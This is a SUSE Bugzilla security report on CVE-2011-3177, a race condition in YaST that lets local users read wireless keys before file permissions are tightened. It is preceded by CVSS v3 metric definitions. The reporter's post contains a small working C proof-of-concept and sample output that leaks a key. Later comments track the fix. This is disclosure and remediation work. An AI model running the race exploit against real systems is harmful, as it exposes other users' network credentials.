# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

| [Description](show_bug.cgi?id=713661#c0)  Thomas Biege   2011-08-23 08:45:40 UTC  ``` Hi. There is a security bug in package 'yast2-network'.  This bug is public.  There is no coordinated release date (CRD) set.   Original posting:   =2D---------  Weitergeleitete Nachricht  ----------  Betreff: [security@suse.de] minor security problem in YaST Datum: Montag, 22. August 2011, 13:43:41 Von: Justus Winter <winter@pre-sense.de> An:  security@suse.de  Hey everyone,  I found a problem in YaST that allows an unprivileged user to retrieve key material from the network configuration.  NetworkInterfaces.ycp/Write() creates the configuration file(s) and changes the permissions of any file containing sensitive information to 0600. Any local user can race against this and read the content of the file.  Exploiting this is surprisingly reliable, probably due to the fact that all configuration files are updated before the file permissions are changed, the high cost of  SCR::Execute(.target.bash, "/bin/chmod 0600 " + file);  just to do an chmod(2) or the execution speed of the ycp interpreter.  The attached program demonstrates the problem:  $ ./race-for-ifcfg /etc/sysconfig/network/ifcfg-wlan0 Got handle... BOOTPROTO='none' [...] WIRELESS_KEY_0='h:aaaaaaaaaaaaaaaa' [...] $ ls -l /etc/sysconfig/network/ifcfg-wlan0 =2Drw------- 1 root root 791 Aug 22 12:06 /etc/sysconfig/network/ifcfg-wlan0  This problem is present in the svn head of YaST.  Cheers, Justus =2D-=20 Justus Winter                               winter@pre-sense.de  PRESENSE Technologies GmbH            Sachsenstr. 5, D-20097 HH                                          USt-IdNr.: DE263765024 Gesch=E4ftsf=FChrer/Managing Directors       AG Hamburg, HRB 107844 Till D=F6rges           J=FCrgen Sander              Axel Theilmann   #include <stdio.h> #include <time.h>  int main(int argc, char **argv) {     FILE *handle;     char buffer[1000];     size_t length;     while (!(handle = fopen(argv[1], "r")));     fprintf(stderr, "Got handle...\n");     sleep(1);     length = fread(buffer, 1, sizeof buffer - 1, handle);     fwrite(buffer, 1, length, stdout);     return 0; } ``` [Comment 1](show_bug.cgi?id=713661#c1)  Martin Vidner   2011-10-11 09:38:53 UTC  ``` Yes. I will extend the interface of the ini-agent to set the file mode before its contents are written.  A quick grep for 'chmod' in an incomplete checkout of yast reveals similar bugs in Kiwi.ycp (yast2-product-creator.rpm) IscsiClientLib.ycp Provider.ycp (yast2-network) ... TODO: do a scan of the complete fresh checkout TODO: Fix another common suspect: .target.string, filename, contents (probably extend filename to be a pair of filename, filemode) ``` [Comment 2](show_bug.cgi?id=713661#c2)  Thomas Biege   2011-10-17 07:33:25 UTC  ``` CVE-2011-3177 ``` [Comment 3](show_bug.cgi?id=713661#c3)  Martin Vidner   2011-11-08 15:54:52 UTC  ``` submitted to SP2:   new API: RPM: yast2-core-2.17.41 SVN: <http://svn.opensuse.org/viewvc/yast?view=revision&revision=66761> to      <http://svn.opensuse.org/viewvc/yast?view=revision&revision=66764> IBS: <https://build.suse.de/request/show/16267>   using it: RPM: yast2-2.17.117 SVN: <http://svn.opensuse.org/viewvc/yast?view=revision&revision=66766> IBS: <https://build.suse.de/request/show/16268>  I have tested manually by creating a wireless ifcfg in yast2 lan and checking that the file has permissions 600 afterwards. ``` [Comment 4](show_bug.cgi?id=713661#c4)  Martin Vidner   2011-11-08 15:56:24 UTC  ``` Please give me a SWAMP ID.  The bug is quite old so probably all our products are affected. ``` [Comment 8](show_bug.cgi?id=713661#c8)  Martin Vidner   2012-01-05 15:50:34 UTC  ``` The SRs in [comment 3](show_bug.cgi?id=713661#c3) had been rejected because of [bnc#728950](http://bugzilla.suse.com/show_bug.cgi?id=728950). It is fixed now, the new packages for SP2 are:  RPM: yast2-core-2.17.43 IBS: <https://build.suse.de/request/show/17095>  RPM: yast2-2.17.118 IBS: <https://build.suse.de/request/show/17096> ``` [Comment 9](show_bug.cgi?id=713661#c9)  Martin Vidner   2012-01-05 17:04:25 UTC  ``` trunk: <http://svn.opensuse.org/viewvc/yast?view=revision&revision=67117> ``` [Comment 10](show_bug.cgi?id=713661#c10)  Bernhard Wiedemann   2012-01-06 15:00:22 UTC  ``` This is an autogenerated message for OBS integration: This bug (713661) was mentioned in <https://build.opensuse.org/request/show/99260> Factory / yast2-core ``` [Comment 11](show_bug.cgi?id=713661#c11)  Bernhard Wiedemann   2012-01-06 16:00:34 UTC  ``` This is an autogenerated message for OBS integration: This bug (713661) was mentioned in <https://build.opensuse.org/request/show/99267> Factory / yast2 ``` [Comment 12](show_bug.cgi?id=713661#c12)  Swamp Workflow Management   2012-03-08 23:43:43 UTC  ``` The SWAMPID for this issue is 45972. This issue was rated as low. Please submit fixed packages until 2012-04-06. Also create a patchinfo file using this link: <https://swamp.suse.de/webswamp/wf/45972> ``` [Comment 13](show_bug.cgi?id=713661#c13)  Martin Vidner   2012-03-14 10:33:23 UTC  ``` (In reply to [comment #1](show_bug.cgi?id=713661#c1)) > A quick grep for 'chmod' in an incomplete checkout of yast reveals similar bugs > in > Kiwi.ycp (yast2-product-creator.rpm) > IscsiClientLib.ycp > Provider.ycp (yast2-network)  Regarding Provider.ycp in yast2-network.rpm: it performs chown root, chmod 700, on /etc/sysconfig/network/providers only after writing files there, which leaves a window of vulnerability. BUT that directory has those permissions+owner to start with, from filesystem.rpm  Therefore it is not necessary to release an update (swamp 45972) for this, only to clean up the code in trunk. ``` [Comment 14](show_bug.cgi?id=713661#c14)  Martin Vidner   2012-03-14 11:05:16 UTC  ``` > only to clean up the code in trunk [for opensuse 12.2] <http://svn.opensuse.org/viewvc/yast?view=revision&revision=67623>  Still to do:  > Kiwi.ycp (yast2-product-creator.rpm) > IscsiClientLib.ycp I'll open separate reports for them. ``` [Comment 15](show_bug.cgi?id=713661#c15)  Martin Vidner   2012-03-20 16:39:53 UTC  ``` Fix for the origial report: [comment 8](show_bug.cgi?id=713661#c8).  Per [comment 13](show_bug.cgi?id=713661#c13) I am removing "maint:running:45972:low maint:planned:update".
